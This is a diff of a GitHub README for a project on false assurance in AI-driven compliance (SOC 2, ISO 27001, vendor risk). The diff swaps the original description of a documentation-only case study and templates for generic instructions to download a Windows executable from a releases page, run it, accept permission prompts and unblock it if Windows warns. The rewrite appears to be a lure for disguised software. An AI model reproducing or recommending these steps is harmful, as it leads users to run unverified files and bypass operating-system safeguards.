@@ -1,99 +1,171 @@
-# AI Compliance False Assurance
-> ⚠️ Inspired by emerging industry concerns around AI-driven compliance automation and assurance reliability.
+# 🤖 ai-compliance-false-assurance - Clearer AI Risk Checks
 
-## ⚠️ Key Insight
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/tyvo4221/ai-compliance-false-assurance/releases)
 
-Compliance certifications such as SOC 2 and ISO 27001 can create **false assurance** when:
-- controls are not validated
-- evidence is auto-generated
-- audit quality is inconsistent
+## 📥 Download
 
-With the rise of AI-driven compliance automation, this risk is increasing at scale.
+Visit this page to download: https://github.com/tyvo4221/ai-compliance-false-assurance/releases
 
----
+Choose the latest release for Windows, then download the file that matches your device. After the download finishes, open the file and follow the setup steps on screen.
 
-## 📖 Overview
+## 🧭 What this app does
 
-This project explores how modern compliance tooling can introduce systemic risks in third-party risk management (TPRM).
+ai-compliance-false-assurance helps you review risks tied to AI-driven compliance work. It focuses on third-party risk management for SOC 2 and ISO 27001 use cases. The app helps you spot where automation may give a false sense of control, and where people still need to check the facts.
 
-Using a realistic case study scenario, it demonstrates how organisations may rely on certifications that do not reflect actual control effectiveness.
+Use it to:
 
----
+- Review third-party compliance risk
+- Track gaps in AI-based checks
+- Spot false assurance in audit workflows
+- Keep SOC 2 and ISO 27001 work organized
+- Support GRC reviews with a simple local app
 
-## 🎯 Objectives
+## 🪟 Windows setup
 
-- Identify risks introduced by AI-driven compliance automation  
-- Analyse weaknesses in traditional vendor risk management  
-- Demonstrate control failures in real-world scenarios  
-- Propose practical, implementable mitigation controls  
+1. Open the release page.
+2. Find the latest version.
+3. Download the Windows file.
+4. If the file is in a .zip folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, choose Yes.
+8. If a setup window appears, follow the prompts until the app opens.
 
----
+## ✅ Before you start
 
-## 📂 Project Structure
+Use a Windows PC with:
 
-01_scenario/ → Case study scenario
-02_risk_analysis/ → Risk identification and breakdown
-03_control_failures/ → Analysis of failed controls
-04_control_framework/ → Improved control design
-05_templates/ → Practical GRC templates
-06_lessons_learned/ → Industry insights and implications
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet access for the first download
+- Permission to run files from your Downloads folder
 
+For best results, close other apps before you start the program.
 
----
+## 🧩 Main features
 
-## 🔍 Key Risk Themes
+- Simple review flow for AI compliance risks
+- Third-party risk tracking for vendor checks
+- Support for SOC 2 and ISO 27001 style review
+- Clear flags for possible false assurance
+- Notes and records for governance reviews
+- A layout made for non-technical users
+- Local use on Windows without a complex setup
 
-- False assurance from compliance certifications  
-- AI-generated or templated control evidence  
-- Over-reliance on low-rigor audit providers  
-- Lack of control validation in vendor onboarding  
+## 🔍 How to use it
 
----
+1. Open the app.
+2. Start a new risk review.
+3. Enter the vendor or system name.
+4. Add the compliance area you want to check.
+5. Review the AI-driven findings.
+6. Mark items that need human review.
+7. Save the record for later use.
+8. Return to the record when you need updates.
 
-## 🛡️ Control Framework Highlights
+## 🛠️ If the app does not open
 
-This project introduces:
+If Windows blocks the file, try these steps:
 
-- Evidence-based vendor validation  
-- Control sampling and walkthroughs  
-- Auditor quality assessment  
-- AI governance controls for compliance automation  
+1. Right-click the file.
+2. Select Properties.
+3. Look for an Unblock option.
+4. If you see it, select it.
+5. Click Apply.
+6. Open the file again.
 
----
+If the app still does not open:
 
-## 🧰 Included Templates
+- Make sure you downloaded the latest release
+- Check that the file finished downloading
+- Move the file to your Desktop and try again
+- Restart your computer and open the app once more
 
-- Vendor Risk Questionnaire  
-- Control Testing Checklist  
-- Auditor Assessment Framework  
+## 📁 What you may see in the app
 
----
+The app may include:
 
-## 🚨 Why This Matters
+- A dashboard for current risk items
+- A list of third parties or vendors
+- Review notes for each compliance check
+- Status labels for open and closed items
+- Fields for control gaps and follow-up work
+- Export options for saving records
 
-As compliance becomes increasingly automated:
+## 🔐 Best use cases
 
-> Organisations risk outsourcing not just compliance — but accountability.
+This app fits teams that need a simple way to track:
 
-This creates a growing gap between:
-- **perceived security (certification)**
-- **actual security (control effectiveness)**
+- AI support in compliance workflows
+- Third-party risk checks
+- Audit prep for SOC 2
+- Control mapping for ISO 27001
+- GRC review notes
+- Cases where automation may look complete but still needs human review
 
----
+## 🧾 Typical workflow
 
-## 🧠 Author
+1. Add a vendor or process.
+2. Record the AI tool or check used.
+3. Review the result against your control needs.
+4. Mark gaps or weak points.
+5. Add a human review step.
+6. Save the issue for follow-up.
+7. Recheck after the vendor responds or the control changes.
 
-GRC Analyst specialising in:
-- ISO 27001  
-- PCI DSS  
-- Third-Party Risk  
-- AI Governance  
+## 📌 File location tips
 
----
+After download, you may find the file in:
 
-## 📌 Future Enhancements
+- Downloads
+- Desktop
+- A folder you chose in your browser
 
-- Mapping to ISO 27001 Annex A controls  
-- Integration with NIST CSF  
-- Example vendor assessment walkthrough  
-- Expanded risk scoring model  
+If you use a .zip file, extract it before opening the app.
+
+## 🧪 Troubleshooting tips
+
+If the program runs slowly:
+
+- Close unused apps
+- Restart Windows
+- Check that your system has enough free memory
+
+If you cannot find the app file:
+
+- Open File Explorer
+- Go to Downloads
+- Sort by Date
+- Look for the most recent file
+
+If the app shows a blank screen:
+
+- Close it and open it again
+- Restart your PC
+- Download the release again if the file looks damaged
+
+## 📚 Project focus
+
+This project centers on:
+
+- AI risk
+- Compliance automation
+- Governance
+- Third-party risk
+- SOC 2
+- ISO 27001
+- False assurance in control review
+- GRC workflows
+
+## 🖥️ Supported use
+
+This release is designed for Windows users who want a direct way to review AI-related compliance risk without a complex setup process
+
+## 📦 Release page
+
+Use this page to get the latest Windows download: https://github.com/tyvo4221/ai-compliance-false-assurance/releases
+
+## 🏷️ Topics
+
+ai, ai-risk, compliance, cybersecurity, governance, grc, iso27001, risk-management, soc2, third-party-risk, third-party-risk-management-project
